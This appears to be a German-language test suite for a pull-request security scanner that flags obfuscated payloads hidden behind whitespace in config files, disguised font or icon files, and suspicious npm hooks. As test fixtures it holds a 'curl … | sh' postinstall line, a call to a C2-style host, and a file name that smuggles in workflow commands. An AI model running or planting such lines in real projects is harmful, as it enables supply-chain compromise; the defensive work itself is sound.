// Tests zu den Befunden der Review-Runde 1: jeder Fall war vorher ein Bypass oder ein Fehlalarm.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { mkdtemp, rm, writeFile, symlink } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { parsePatch, saeuberePfad } from '../lib/diff.mjs';
import { befund } from '../lib/befund.mjs';
import { pruefeAnhang, GLOBAL_TAG } from '../lib/regeln/anhang.mjs';
import { pruefeMarker } from '../lib/regeln/marker.mjs';
import { pruefeTarnung, laengsterBase64Lauf } from '../lib/regeln/tarnung.mjs';
import { pruefeDateien } from '../lib/regeln/index.mjs';
import { toMarkdown } from '../lib/bericht/markdown.mjs';
import { toConsole } from '../lib/bericht/konsole.mjs';
import { kappe } from '../bin/action.mjs';
import { pseudoBlob, fuellung, datei } from './hilfen.mjs';

const exec = promisify(execFile);
const added = (d) => parsePatch(d.patch).added;
const boeseZeile = 'export default {};' + fuellung(507) + pseudoBlob(3000) + 'fromCharCode(';

test('Bypass: Zeilen, die mit ++ oder -- beginnen, werden nicht mehr übersprungen', () => {
  const d = datei('postcss.config.mjs', ['++x;' + fuellung(500) + pseudoBlob(3000) + 'eval(', 'normal']);
  const a = added(d);
  assert.equal(a.length, 2);
  assert.deepEqual(a.map((x) => x.zeile), [1, 2]);
  assert.equal(pruefeAnhang(d, a)[0]?.stufe, 'block');
});

test('Dateinamen-Injektion: Zeilenumbrüche, Workflow-Commands, ESC und Bidi-Zeichen werden entschärft', () => {
  const fies = 'x.js\n::set-output name=level::none\n\n[Passwort](https://evil)\x1b[2J‮';
  assert.equal(saeuberePfad(fies), 'x.js␊::set-output name=level::none␊␊[Passwort](https://evil)');
  const b = befund({ regel: 'r', stufe: 'warn', datei: fies, warum: 'w\n::error::x' });
  assert.ok(!b.datei.includes('\n') && !b.warum.includes('\n'));
  const e = { befunde: [b], meta: { ziel: 'x', dateien: 1, hinweise: [] } };
  const m = toMarkdown(e);
  assert.ok(!/^::/m.test(m), 'kein Workflow-Command am Zeilenanfang');
  assert.ok(!m.replace(/`[^`]*`/g, '').includes('](https://evil)'), 'kein Link außerhalb von Code-Spans');
  assert.ok(!m.includes('\n::set-output'), 'Dateiname bleibt in einer Zeile');
  const k = toConsole(e, { farben: false });
  assert.ok(!/^::/m.test(k) && !k.includes('\x1b'));
});

test('Unicode-Weißraum als Füllung (NBSP, Em-Space, ideographisch) wird erkannt', () => {
  for (const ws of [' ', ' ', '　']) {
    const d = datei('tailwind.config.js', ['module.exports = {};' + ws.repeat(400) + pseudoBlob(400) + 'atob(']);
    assert.equal(pruefeAnhang(d, added(d))[0]?.regel, 'anhang/fuellung', JSON.stringify(ws));
  }
});

test('Füllung gilt auch in dist/, .min.js und .vue; Riesenzeile dort nicht', () => {
  for (const p of ['dist/app.js', 'vendor/lib.min.js', 'src/App.vue', 'index.html', 'config.yml']) {
    const d = datei(p, [boeseZeile]);
    assert.equal(pruefeAnhang(d, added(d))[0]?.regel, 'anhang/fuellung', p);
  }
  const riesig = datei('dist/app.js', [pseudoBlob(8000) + 'Function(']);
  assert.deepEqual(pruefeAnhang(riesig, added(riesig)), []);
});

test('Payload ohne Code-Token hinter Füllung → warn (hohe Entropie), harmloser Text hinter Füllung → nichts', () => {
  const ohneToken = pseudoBlob(2000).replace(/fromCharCode|charCodeAt|split|join|function/g, 'zz');
  const d = datei('next.config.mjs', ['export default x;' + fuellung(300) + ohneToken]);
  const b = pruefeAnhang(d, added(d));
  assert.equal(b[0]?.regel, 'anhang/fuellung');
  assert.equal(b[0]?.stufe, 'warn');
  const harmlos = datei('src/a.js', ['const a = 1;' + fuellung(300) + '// ' + 'lorem ipsum dolor sit amet '.repeat(20)]);
  assert.deepEqual(pruefeAnhang(harmlos, added(harmlos)), []);
});

test('Fehlalarme: global.TZ in jest.setup, vscode-irgendwas.vercel.app, PNG als .ico', () => {
  assert.ok(!GLOBAL_TAG.test("global.TZ = 'UTC'"));
  assert.ok(!GLOBAL_TAG.test("global.__DEV__ = 'true'"));
  const jest = datei('jest.setup.js', ["global.TZ = 'UTC';", "global.fetch = require('node-fetch');"]);
  assert.deepEqual(pruefeAnhang(jest, added(jest)), []);
  const readme = datei('README.md', ['See https://vscode-icons.vercel.app for icons']);
  assert.deepEqual(pruefeMarker(readme, added(readme)), []);
  const echt = datei('x.js', ['fetch("https://260120.vercel.app/a")']);
  assert.equal(pruefeMarker(echt, added(echt))[0]?.regel, 'marker/polinrider-c2-host');
  const png = Buffer.from('89504e470d0a1a0a0000000d49484452000000', 'hex');
  const ico = pruefeTarnung({ filename: 'favicon.ico' }, png);
  assert.equal(ico[0]?.stufe, 'warn');
  assert.match(ico[0].warum, /\.png/);
  const mp3 = Buffer.from('fffa9000', 'hex');
  assert.deepEqual(pruefeTarnung({ filename: 'a.mp3' }, mp3), []);
  const text = pruefeTarnung({ filename: 'a.woff2' }, Buffer.from('hello world, this is plain text and not a font at all'));
  assert.equal(text[0]?.stufe, 'block');
});

test('Dedupe behält die höchste Stufe je Datei und Regel', async () => {
  const pkg = datei('package.json', ['  "prepare": "husky",', '  "postinstall": "curl https://x.example/i.sh | sh",']);
  const r = await pruefeDateien([pkg]);
  const lc = r.befunde.find((b) => b.regel === 'autostart/npm-lifecycle');
  assert.equal(lc.stufe, 'block');
});

test('Fail-closed: Code-Datei ohne Diff wird aus dem Blob geprüft; Blob-Deckel meldet sich', async () => {
  const gross = { filename: 'apps/web/postcss.config.mjs', status: 'modified', additions: 9000, deletions: 0, sha: 'a'.repeat(40) };
  const r = await pruefeDateien([gross], { ladeBytes: async () => Buffer.from(boeseZeile + '\n') });
  assert.ok(r.befunde.some((b) => b.regel === 'anhang/fuellung' && b.stufe === 'block'));
  const fonts = Array.from({ length: 3 }, (_, i) => ({ filename: `f${i}.woff2`, status: 'added', additions: 0, deletions: 0, sha: 'b'.repeat(40) }));
  const r2 = await pruefeDateien(fonts, { ladeBytes: async () => Buffer.from('774f4632', 'hex'), maxBlobs: 2 });
  assert.equal(r2.befunde.filter((b) => b.regel === 'pruefung/unvollstaendig').length, 1);
  const r3 = await pruefeDateien([], { kontext: { erwarteteDateien: 5 } });
  assert.match(r3.befunde[0].warum, /meldet 5/);
});

test('Base64-Scan ist linear: 1-MB-Zeile mit vielen 1999er-Läufen unter 300 ms', () => {
  const zeile = ('A'.repeat(1999) + ' ').repeat(500);
  const t = Date.now();
  assert.equal(laengsterBase64Lauf(zeile), null);
  assert.ok(Date.now() - t < 1000, 'linear, nicht quadratisch (Regex brauchte ~2 s)');
  assert.equal(laengsterBase64Lauf('x ' + 'B'.repeat(2500) + ' y').length, 2500);
});

test('kappe kürzt lange Kommentare', () => {
  assert.equal(kappe('abc', 10), 'abc');
  assert.ok(kappe('x'.repeat(100), 10).startsWith('xxxxxxxxxx\n\n_… gekürzt'));
});

test('Start über Symlink (npm-bin) funktioniert', async () => {
  const dir = await mkdtemp(path.join(os.tmpdir(), 'schleuse-link-'));
  try {
    const link = path.join(dir, 'schleuse');
    await symlink(new URL('../bin/schleuse.mjs', import.meta.url).pathname, link);
    const boese = path.join(dir, 'postcss.config.mjs');
    await writeFile(boese, boeseZeile + '\n');
    await assert.rejects(exec(process.execPath, [link, 'files', boese]), (e) => e.code === 1 && /BLOCK/.test(e.stdout));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
